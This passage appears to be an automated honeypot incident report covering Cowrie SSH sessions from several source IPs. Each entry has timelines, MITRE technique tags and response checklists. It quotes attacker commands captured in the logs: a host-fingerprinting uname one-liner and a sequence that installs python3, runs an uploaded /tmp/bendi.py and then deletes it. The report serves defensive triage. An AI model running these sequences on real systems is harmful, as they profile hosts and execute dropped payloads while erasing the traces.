- [ ] Block `107.135.117[.]245` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fae00896d4fd

| Field | Detail |
|---|---|
| **Source IP** | `81.22.51[.]64` |
| **First Seen** | 2026-07-30 01:02 |
| **Last Seen** | 2026-07-30 01:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:02:55` | `cowrie.session.connect` |
| `2026-07-30 01:02:56` | `cowrie.client.version` |
| `2026-07-30 01:02:56` | `cowrie.client.kex` |
| `2026-07-30 01:02:57` | `cowrie.login.success` |
| `2026-07-30 01:02:57` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.22.51[.]64` to AbuseIPDB if not already reported
- [ ] Block `81.22.51[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05b3acb2a3ed

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-07-30 01:03 |
| **Last Seen** | 2026-07-30 01:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:03:08` | `cowrie.session.connect` |
| `2026-07-30 01:03:08` | `cowrie.client.version` |
| `2026-07-30 01:03:08` | `cowrie.client.kex` |
| `2026-07-30 01:03:11` | `cowrie.login.success` |
| `2026-07-30 01:03:11` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0c3dd4e26077

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-30 01:09 |
| **Last Seen** | 2026-07-30 01:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:09:05` | `cowrie.session.connect` |
| `2026-07-30 01:09:05` | `cowrie.client.version` |
| `2026-07-30 01:09:05` | `cowrie.client.kex` |
| `2026-07-30 01:09:06` | `cowrie.login.success` |
| `2026-07-30 01:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f81f702bb31d

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-30 01:09 |
| **Last Seen** | 2026-07-30 01:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:09:06` | `cowrie.session.connect` |
| `2026-07-30 01:09:06` | `cowrie.client.version` |
| `2026-07-30 01:09:07` | `cowrie.client.kex` |
| `2026-07-30 01:09:07` | `cowrie.login.success` |
| `2026-07-30 01:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-242577e9cbe8

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-30 01:09 |
| **Last Seen** | 2026-07-30 01:11 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:09:13` | `cowrie.session.connect` |
| `2026-07-30 01:09:13` | `cowrie.client.version` |
| `2026-07-30 01:09:13` | `cowrie.client.kex` |
| `2026-07-30 01:09:14` | `cowrie.login.success` |
| `2026-07-30 01:09:16` | `cowrie.session.file_upload` |
| `2026-07-30 01:09:17` | `cowrie.session.params` |
| `2026-07-30 01:09:17` | `cowrie.command.input` |
| `2026-07-30 01:09:17` | `cowrie.command.input` |
| `2026-07-30 01:09:17` | `cowrie.command.input` |
| `2026-07-30 01:09:17` | `cowrie.command.failed` |
| `2026-07-30 01:09:17` | `cowrie.log.closed` |
| `2026-07-30 01:09:18` | `cowrie.session.params` |
| `2026-07-30 01:09:18` | `cowrie.command.input` |
| `2026-07-30 01:09:18` | `cowrie.log.closed` |
| `2026-07-30 01:09:19` | `cowrie.session.params` |
| `2026-07-30 01:09:19` | `cowrie.command.input` |
| `2026-07-30 01:09:20` | `cowrie.log.closed` |
| `2026-07-30 01:09:21` | `cowrie.session.params` |
| `2026-07-30 01:09:21` | `cowrie.command.input` |
| `2026-07-30 01:09:21` | `cowrie.command.failed` |
| `2026-07-30 01:09:21` | `cowrie.command.failed` |
| `2026-07-30 01:10:22` | `cowrie.session.params` |
| `2026-07-30 01:10:22` | `cowrie.command.input` |
| `2026-07-30 01:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6cc12283a4e8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:10 |
| **Last Seen** | 2026-07-30 01:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:10:06` | `cowrie.session.connect` |
| `2026-07-30 01:10:06` | `cowrie.client.version` |
| `2026-07-30 01:10:06` | `cowrie.client.kex` |
| `2026-07-30 01:10:08` | `cowrie.login.success` |
| `2026-07-30 01:10:10` | `cowrie.session.params` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.success` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:10` | `cowrie.command.input` |
| `2026-07-30 01:10:11` | `cowrie.log.closed` |
| `2026-07-30 01:10:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a205abf70c8f

| Field | Detail |
|---|---|
| **Source IP** | `146.56.164[.]20` |
| **First Seen** | 2026-07-30 01:11 |
| **Last Seen** | 2026-07-30 01:13 |
| **Session Duration** | 129s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:11:22` | `cowrie.session.connect` |
| `2026-07-30 01:11:22` | `cowrie.client.version` |
| `2026-07-30 01:11:22` | `cowrie.client.kex` |
| `2026-07-30 01:11:23` | `cowrie.login.success` |
| `2026-07-30 01:11:25` | `cowrie.session.file_upload` |
| `2026-07-30 01:11:26` | `cowrie.session.params` |
| `2026-07-30 01:11:26` | `cowrie.command.input` |
| `2026-07-30 01:11:26` | `cowrie.command.input` |
| `2026-07-30 01:11:26` | `cowrie.command.input` |
| `2026-07-30 01:11:26` | `cowrie.command.failed` |
| `2026-07-30 01:11:26` | `cowrie.log.closed` |
| `2026-07-30 01:11:27` | `cowrie.session.params` |
| `2026-07-30 01:11:27` | `cowrie.command.input` |
| `2026-07-30 01:11:27` | `cowrie.log.closed` |
| `2026-07-30 01:11:29` | `cowrie.session.params` |
| `2026-07-30 01:11:29` | `cowrie.command.input` |
| `2026-07-30 01:11:29` | `cowrie.log.closed` |
| `2026-07-30 01:11:30` | `cowrie.session.params` |
| `2026-07-30 01:11:30` | `cowrie.command.input` |
| `2026-07-30 01:11:30` | `cowrie.command.failed` |
| `2026-07-30 01:11:30` | `cowrie.command.failed` |
| `2026-07-30 01:12:31` | `cowrie.session.params` |
| `2026-07-30 01:12:31` | `cowrie.command.input` |
| `2026-07-30 01:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.56.164[.]20` to AbuseIPDB if not already reported
- [ ] Block `146.56.164[.]20` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e122239fc9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:11 |
| **Last Seen** | 2026-07-30 01:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:11:25` | `cowrie.session.connect` |
| `2026-07-30 01:11:26` | `cowrie.client.version` |
| `2026-07-30 01:11:26` | `cowrie.client.kex` |
| `2026-07-30 01:11:29` | `cowrie.login.success` |
| `2026-07-30 01:11:31` | `cowrie.session.params` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.success` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.command.input` |
| `2026-07-30 01:11:31` | `cowrie.log.closed` |
| `2026-07-30 01:11:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-360a84e89b74

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:12 |
| **Last Seen** | 2026-07-30 01:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:12:47` | `cowrie.session.connect` |
| `2026-07-30 01:12:48` | `cowrie.client.version` |
| `2026-07-30 01:12:48` | `cowrie.client.kex` |
| `2026-07-30 01:12:50` | `cowrie.login.success` |
| `2026-07-30 01:12:51` | `cowrie.session.params` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.success` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:51` | `cowrie.command.input` |
| `2026-07-30 01:12:52` | `cowrie.log.closed` |
| `2026-07-30 01:12:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a442f72ce23b

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-07-30 01:12 |
| **Last Seen** | 2026-07-30 01:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:12:55` | `cowrie.session.connect` |
| `2026-07-30 01:12:56` | `cowrie.login.success` |
| `2026-07-30 01:12:56` | `cowrie.session.params` |
| `2026-07-30 01:12:57` | `cowrie.command.input` |
| `2026-07-30 01:12:58` | `cowrie.command.input` |
| `2026-07-30 01:12:58` | `cowrie.command.input` |
| `2026-07-30 01:12:59` | `cowrie.command.input` |
| `2026-07-30 01:12:59` | `cowrie.command.failed` |
| `2026-07-30 01:13:00` | `cowrie.log.closed` |
| `2026-07-30 01:13:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e097c7a4d003

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:15 |
| **Last Seen** | 2026-07-30 01:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:15:36` | `cowrie.session.connect` |
| `2026-07-30 01:15:36` | `cowrie.client.version` |
| `2026-07-30 01:15:36` | `cowrie.client.kex` |
| `2026-07-30 01:15:38` | `cowrie.login.success` |
| `2026-07-30 01:15:40` | `cowrie.session.params` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.success` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:40` | `cowrie.command.input` |
| `2026-07-30 01:15:41` | `cowrie.log.closed` |
| `2026-07-30 01:15:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5f337fc6f70

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:17 |
| **Last Seen** | 2026-07-30 01:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:17:02` | `cowrie.session.connect` |
| `2026-07-30 01:17:03` | `cowrie.client.version` |
| `2026-07-30 01:17:03` | `cowrie.client.kex` |
| `2026-07-30 01:17:04` | `cowrie.login.success` |
| `2026-07-30 01:17:06` | `cowrie.session.params` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.success` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.command.input` |
| `2026-07-30 01:17:06` | `cowrie.log.closed` |
| `2026-07-30 01:17:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19eea93e9727

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:18 |
| **Last Seen** | 2026-07-30 01:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:18:29` | `cowrie.session.connect` |
| `2026-07-30 01:18:29` | `cowrie.client.version` |
| `2026-07-30 01:18:29` | `cowrie.client.kex` |
| `2026-07-30 01:18:31` | `cowrie.login.success` |
| `2026-07-30 01:18:32` | `cowrie.session.params` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.success` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:32` | `cowrie.command.input` |
| `2026-07-30 01:18:33` | `cowrie.log.closed` |
| `2026-07-30 01:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfd367122e2b

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-30 01:19 |
| **Last Seen** | 2026-07-30 01:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:19:23` | `cowrie.session.connect` |
| `2026-07-30 01:19:23` | `cowrie.client.version` |
| `2026-07-30 01:19:23` | `cowrie.client.kex` |
| `2026-07-30 01:19:23` | `cowrie.login.success` |
| `2026-07-30 01:19:23` | `cowrie.direct-tcpip.request` |
| `2026-07-30 01:19:23` | `cowrie.direct-tcpip.data` |
| `2026-07-30 01:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-790d093ca320

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:19 |
| **Last Seen** | 2026-07-30 01:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-30 01:19:54` | `cowrie.session.connect` |
| `2026-07-30 01:19:54` | `cowrie.client.version` |
| `2026-07-30 01:19:54` | `cowrie.client.kex` |
| `2026-07-30 01:19:55` | `cowrie.login.success` |
| `2026-07-30 01:19:56` | `cowrie.session.params` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.success` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.command.input` |
| `2026-07-30 01:19:56` | `cowrie.log.closed` |
| `2026-07-30 01:19:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8584deade0d9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-07-30 01:21 |
| **Last Seen** | 2026-07-30 01:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
